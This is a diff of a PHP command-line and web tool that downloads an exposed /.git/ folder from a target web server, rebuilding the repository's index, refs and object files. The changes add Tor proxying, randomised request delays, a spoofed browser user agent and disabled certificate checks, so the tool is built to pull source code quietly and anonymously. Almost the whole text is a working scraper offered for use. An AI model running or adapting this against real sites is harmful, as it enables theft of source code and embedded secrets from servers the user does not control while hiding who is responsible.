@@ -1,6 +1,6 @@
 <?php
 /**
- * Downloader Git Folder v0.0.0.2 (do-git)
+ * Downloader Git Folder v0.0.1.0 (do-git)
  * CLI && WEB version
  *
  * @description Downloader /.git/ (folder/files) repository without --bare
@@ -12,11 +12,11 @@
 set_time_limit(0);
 
 if (PHP_SAPI == 'cli') {
-	$usage = 'usage: php ' . basename($_SERVER['PHP_SELF']) . ' -u http://target/.git/ -l';
-	$opt = getopt("u:l");
+	$usage = 'usage: php ' . basename($_SERVER['PHP_SELF']) . ' -u http://target/.git/ -l -t';
+	$opt = getopt("u:l:t");
 	$nl = PHP_EOL;
 } else {
-	$usage = 'usage: ' . $_SERVER['PHP_SELF'] . '?u=http://target/.git/&l';
+	$usage = 'usage: ' . $_SERVER['PHP_SELF'] . '?u=http://target/.git/&l&t';
 	$opt = $_GET;
 	$nl = '<br/>';
 }
@@ -31,21 +31,34 @@ if (empty($opt['u'])
 if (substr($opt['u'], -1) != '/') {
 	$opt['u'] .= '/';
 }
-$url = $opt['u'];
 
-$log = isset($opt['l']);
+define('URL', $opt['u']);
+define('LOG', isset($opt['l']));
+define('TOR', isset($opt['t']));
 
 $structure = array(
 	'' => array(
 		'index',        // not empty repository
 		'config',
 		'description',
+		'packed-refs',
+		'FETCH_HEAD',
 		'HEAD',
+		'ORIG_HEAD',
 	),
 	'logs/' => array(
 		'HEAD',
 	),
 	'objects/' => array(
+
+	),
+	'hooks/' => array(
+
+	),
+	'info/' => array(
+
+	),
+	'refs/' => array(
 
 	),
 );
@@ -58,10 +71,16 @@ foreach ($structure as $path => $file) {
 	}
 	if (!empty($file)) {
 		for ($i = 0, $ic = count($file); $i < $ic; $i++) {
-			if (!$data = @file_get_contents($url . $path . $file[$i])) {
+			if (file_exists($dir . $path . $file[$i]) && filesize($dir . $path . $file[$i]) > 0) {
+				continue;
+			}
+			$http_code = 0;
+			if (($data = get(URL . $path . $file[$i], $http_code)) && $http_code == 200) {
+				file_put_contents($dir . $path . $file[$i], $data);
+			}
+			elseif ($file[$i] == 'index') {
 				exit('no .git');
 			}
-			file_put_contents($dir . $path . $file[$i], $data);
 		}
 	}
 }
@@ -77,6 +96,7 @@ $version  = fread($fn, 4);
 $entries  = fread($fn, 4);
 $complete = 0;
 $failure  = 0;
+$packed   = 0;
 
 while (!feof($fn) && $size - ftell($fn) >= 64) {
 
@@ -97,7 +117,7 @@ while (!feof($fn) && $size - ftell($fn) >= 64) {
 
 	$subdir = fread($fn, 1);
 
-	$get = $url . 'objects/' . bin2hex($subdir) . '/';
+	$get = URL . 'objects/' . bin2hex($subdir) . '/';
 	$target = $dir . 'objects/' . bin2hex($subdir) . '/';
 
 	if (!is_dir($target)) {
@@ -115,17 +135,30 @@ while (!feof($fn) && $size - ftell($fn) >= 64) {
 	$get .= $file;
 	$target .= $file;
 
-	if ($data = @file_get_contents($get)) {
-		file_put_contents($target, $data);
-		$complete++;
-	} else {
-		$failure++;
-		if ($log) {
-			echo '[FAIL!] - ' . $nl;
+	if (!file_exists($target) || filesize($target) == 0) {
+
+		$http_code = 0;
+		$data      = get($get, $http_code);
+
+		if ($http_code == 200) {
+			file_put_contents($target, $data);
+			$complete++;
+		} elseif ($http_code == 404) {              // if object not found then file packed
+			$packed++;
+			if (LOG) {
+				echo '[PACK] - ';
+			}
+		} else {
+			$failure++;
+			if (LOG) {
+				echo '[FAIL] - ';
+			}
 		}
+
+		usleep(rand(100000, 1000000));
 	}
 
-	if ($log) {
+	if (LOG) {
 		echo $original . ' - ' . $get . '' . $nl;
 	}
 }
@@ -133,6 +166,42 @@ while (!feof($fn) && $size - ftell($fn) >= 64) {
 fclose($fn);
 
 echo 'complete: ' . $complete . $nl;
+if ($packed > 0) {
+	echo 'packed: ' . $packed . $nl;
+}
 if ($failure > 0) {
 	echo 'failure: ' . $failure . $nl;
+}
+
+
+function get($url, &$http_code = 0) {
+
+	if (!function_exists('curl_init')) {
+		die('no curl');
+	}
+
+	$curl = curl_init($url);
+
+	if (TOR) {
+		curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+		curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:9050');
+	}
+
+	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($curl, CURLOPT_HEADER, false);
+	curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
+	curl_setopt($curl, CURLOPT_TIMEOUT, 120);
+	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+	curl_setopt($curl, CURLOPT_REFERER, '-');
+	curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0');
+
+	$page = curl_exec($curl);
+
+	$info = curl_getinfo($curl);
+	$http_code = $info['http_code'];
+
+	curl_close($curl);
+
+	return $page;
 }
